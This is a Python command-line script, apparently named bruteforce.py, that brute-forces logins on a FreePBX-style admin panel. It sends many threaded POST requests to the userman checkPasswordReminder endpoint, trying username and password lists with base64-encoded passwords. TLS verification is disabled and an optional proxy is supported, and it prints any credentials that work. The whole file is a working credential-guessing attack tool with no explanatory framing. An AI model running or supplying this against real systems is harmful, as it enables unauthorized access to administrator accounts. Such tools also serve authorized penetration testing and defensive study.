import requests
import base64
import os
import sys
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote
from typing import List

requests.packages.urllib3.disable_warnings()

progress_lock = threading.Lock()
progress_counter = 0
total_combinations = 0
custom_proxy = None

def read_file_lines(file_path: str) -> List[str]:
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def is_file(path: str) -> bool:
    return os.path.isfile(path)

def test_connection(target: str):
    post_url = f"{target}/admin/ajax.php?module=userman&command=checkPasswordReminder"
    proxies = {"http": custom_proxy, "https": custom_proxy} if custom_proxy else None
    try:
        requests.post(post_url, timeout=5, proxies=proxies, verify=False)
    except requests.exceptions.ProxyError:
        print(f"[!] Proxy unreachable: {custom_proxy}")
        sys.exit(1)
    except requests.exceptions.ConnectionError:
        print(f"[!] Target unreachable: {target}")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection test failed: {e}")
        sys.exit(1)

def attempt_login(target: str, username: str, password: str, executor):
    global progress_counter

    encoded_password = base64.b64encode(password.encode()).decode()
    url_encoded_password = quote(encoded_password, safe='')

    post_url = f"{target}/admin/ajax.php?module=userman&command=checkPasswordReminder"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': target,
        'Referer': f"{target}/admin/config.php"
    }

    data = f"username={username}&password={url_encoded_password}&loginpanel=admin"
    proxies = {"http": custom_proxy, "https": custom_proxy} if custom_proxy else None

    try:
        response = requests.post(post_url, headers=headers, data=data, proxies=proxies, verify=False, timeout=15)
        with progress_lock:
            progress_counter += 1
            print(f"[{progress_counter}/{total_combinations}]", end='\r')
        if response.status_code == 200 and "Invalid Login Credentials" not in response.text:
            print(f"\n[+] SUCCESS: {username}:{password} -> {url_encoded_password}")
            print(response.text)
    except requests.exceptions.Timeout:
        print(f"\n[!] Timeout: {username}:{password} — retrying (consider lowering -w)")
        executor.submit(attempt_login, target, username, password, executor)
    except requests.exceptions.ProxyError:
        print(f"\n[!] Proxy error: Cannot reach proxy {custom_proxy}")
        sys.exit(1)
    except requests.exceptions.ConnectionError:
        print(f"\n[!] Connection error: Cannot connect to target {target}")
        sys.exit(1)
    except:
        with progress_lock:
            progress_counter += 1
            print(f"[{progress_counter}/{total_combinations}] ERROR", end='\r')

def send_request(target: str, u: str, p: str, w: int):
    global total_combinations

    usernames = read_file_lines(u) if is_file(u) else [u]
    passwords = read_file_lines(p) if is_file(p) else [p]
    total_combinations = len(usernames) * len(passwords)

    with ThreadPoolExecutor(max_workers=w) as executor:
        for username in usernames:
            for password in passwords:
                executor.submit(lambda u=username, p=password: attempt_login(target, u, p, executor))


def parse_args():
    global custom_proxy
    if '-t' not in sys.argv or '-u' not in sys.argv or '-p' not in sys.argv or '-w' not in sys.argv:
        print("Usage: python bruteforce.py -t <http://IP> -u <username|file> -p <password|file> -w <threads> [--proxy http://IP:PORT]")
        sys.exit(1)

    try:
        t_index = sys.argv.index('-t') + 1
        u_index = sys.argv.index('-u') + 1
        p_index = sys.argv.index('-p') + 1
        w_index = sys.argv.index('-w') + 1

        target = sys.argv[t_index].rstrip('/')
        username = sys.argv[u_index]
        password = sys.argv[p_index]
        workers = int(sys.argv[w_index])

        if '--proxy' in sys.argv:
            proxy_index = sys.argv.index('--proxy') + 1
            custom_proxy = sys.argv[proxy_index]

        return target, username, password, workers
    except:
        print("Invalid arguments.")
        sys.exit(1)

if __name__ == "__main__":
    target, u, p, w = parse_args()
    test_connection(target)
    send_request(target, u, p, w)
